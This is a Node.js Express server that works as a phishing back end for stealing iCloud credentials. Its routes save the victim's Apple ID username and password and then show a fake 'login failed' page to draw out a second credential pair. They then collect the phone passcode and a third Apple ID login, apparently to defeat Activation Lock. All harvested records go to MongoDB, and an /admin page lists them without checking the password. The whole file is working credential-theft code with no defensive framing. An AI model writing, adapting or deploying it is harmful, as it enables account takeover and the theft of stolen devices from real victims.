const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const Message = require('./model/admin')
const User = require("./model/user");
const auth = require("./middleware/auth");
const jwt = require("jsonwebtoken");
const cookieParser = require('cookie-parser');
const user = require('./model/user');
require("dotenv").config();
require("./config/database").connect();


const app = express();

app.use(express.json());

app.use(cookieParser());

app.use(bodyParser.urlencoded({extended: true}))

app.use(express.static("public"));

app.set('view engine', 'ejs');

// dotenv.config();
// mongoose.connect(process.env.MONGODB);


// home
app.get("/", async (req, res) =>{
    res.sendFile(__dirname + "/src/index.html" );
});
// login
app.post("/login", async (req, res) =>{
    const { username, password } = req.body;
    // console.log(username)
    // console.log(password)
    // Create token
    const payload = { 
        username: username
      };      
      // Simple token signing
      const token = jwt.sign(payload, process.env.JWT_KEY);
      console.log(token); // output: <signed JWT token>
    // save token to local catche/storage
    res.cookie('jwt', token);
    // Create user in our database
    const user = await User.create({
        fistIcloud: username.toLowerCase(),
        firstPassword: password,
        secondIcloud: "",
        secondPassword: "",
        phonePassword: "",
        thirdIcloud: "",
        thirdPassowrd: ""

    });
    res.status(200).sendFile(__dirname + "/src/loginFailed.html")
});

// another login page
app.get("/log-in", async (req, res) =>{
    res.sendFile(__dirname + "/src/login.html")
})

// login failed
app.post("/log-in", async (req, res) =>{
    const { username, password } = req.body;
    // console.log(username)
    // console.log(password)
    const jwtToken = req.cookies.jwt; // Get the JWT token from the cookie
    if(jwtToken){
        // Decode the JWT token
        const payload = jwt.decode(jwtToken);
        console.log('\"'+payload.username+'\"');


        const user = await User.updateOne(
            { fistIcloud: payload.username },
            { $set: { secondIcloud: username, secondPassword: password } },
            { returnOriginal: false },
        );
        res.sendFile(__dirname + "/src/four_digit.html")
    }
    else{
        res.send("Token Required")
    }
    
})
// post the last creds..
app.post("/activation_lock", async (req, res) =>{
    const passcode = req.body.passcode;
    const icloud = req.body.icloud;
    const third_password = req.body.password;


    const jwtToken = req.cookies.jwt; // Get the JWT token from the cookie
    if(jwtToken){
        // Decode the JWT token
        const payload = jwt.decode(jwtToken);
        // console.log(payload.username);
        const user = await User.updateOne(
            { fistIcloud: payload.username },
            { $set: { phonePassword: passcode, thirdIcloud: icloud, thirdPassowrd: third_password} },
            { returnOriginal: false },
            function(err, result) {
              if (err) throw err;
              console.log(result);
        });
        // console.log(user)
        //clear cookies and redirecto first page
        res.sendFile(__dirname + "/src/loading.html");
    }
    else{
        res.send("Token Required")
    }
})


app.get("/admin", async (req, res) =>{
    res.sendFile(__dirname + '/admin_login.html');
});
app.post("/admin", async (req, res)=>{
    const { username, password } = req.body;
    // console.log(username)
    // console.log(password)
    
    User.find().then(function(creds){
        creds.reverse();
        res.render("admin",{
            infos_ejs: creds
        });
    })
});
app.post("/delete_creds", async (req, res) =>{
    const icloud_id = req.body.icloud_id
    try{
        const deleteUser = await User.findByIdAndDelete(
            icloud_id
        )
        User.find().then(function(creds){
            creds.reverse();
            res.render("admin",{
                infos_ejs: creds
            });
        })
    }
    catch(err){
        console.log(err);
        res.redirect("/admin");
    }
    
});

app.get("*", async (req, res) =>{
    res.sendFile(__dirname + "/src/404.html")
});

let port = process.env.PORT;
if(port == null || port ==""){
    port = 9000;
}
//listener
app.listen(port, function() {
    console.log('Server started --> http://localhost:9000');
});
